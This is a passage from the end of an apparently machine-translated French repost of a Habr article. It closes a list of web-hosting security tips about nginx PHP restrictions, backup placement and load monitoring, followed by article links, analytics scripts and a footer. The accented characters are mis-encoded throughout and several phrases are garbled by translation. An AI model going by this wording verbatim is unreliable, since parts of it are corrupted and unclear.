nginx, il vaut la peine d'ajouter des rÃ¨gles Ã  la configuration de l'hÃ´te virtuel qui interdisent d'exÃ©cuter des scripts php autres que index.php dans les sections racine et admin du site. </li><li>  Ne jetez pas de dÃ©chets de votre compte.  Si vous avez un magasin, que ce soit un magasin.  Ne chargez pas sous un seul compte un tas de blogs wp, un seau de bugs et divers domaines de test. </li><li>  Ne stockez jamais de sauvegardes d'un site ou d'une base de donnÃ©es Ã  la racine de votre hÃ´te virtuel. </li><li>  Regardez la charge sur le serveur / l'hÃ©bergement, essayez de garder l'approvisionnement au moins x2 contre les pics de charge, et si soudainement la charge augmente soudainement sans raison, essayez de trouver la raison.  Mieux vaut dÃ©passer que de ne pas dÃ©passer! </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr466283/">https://habr.com/ru/post/fr466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr466263/index.html">SystÃ¨mes RPC de rÃ©fÃ©rence (et Json inversÃ©)</a></li>
<li><a href="../fr466267/index.html">Pourquoi beaucoup sous-estiment leurs jeux</a></li>
<li><a href="../fr466271/index.html">Cours communs Groupe-IB et Belkasoft: ce que nous enseignons et qui venir</a></li>
<li><a href="../fr466279/index.html">La plupart des appareils Android vulnÃ©rables aux attaques de phishing via SMS</a></li>
<li><a href="../fr466281/index.html">RÃ©alitÃ© virtuelle, jeux open source et voitures Ã©lectriques: ce que John Carmack a dit sur le podcast Joe Rogan</a></li>
<li><a href="../fr466285/index.html">Un petit cadeau: combo dvr et dÃ©tecteur de radar</a></li>
<li><a href="../fr466287/index.html">Rapport et recherche sur la fiabilitÃ© des segments Internet nationaux 2019</a></li>
<li><a href="../fr466289/index.html">Initiatives lÃ©gislatives. Ã‰trange, mais prÃ©sentÃ© Ã  la Douma d'Ã‰tat</a></li>
<li><a href="../fr466291/index.html">EnquÃªte de durabilitÃ© des segments Internet nationaux pour 2019</a></li>
<li><a href="../fr466295/index.html">Cache de secours indolore sur Scala</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>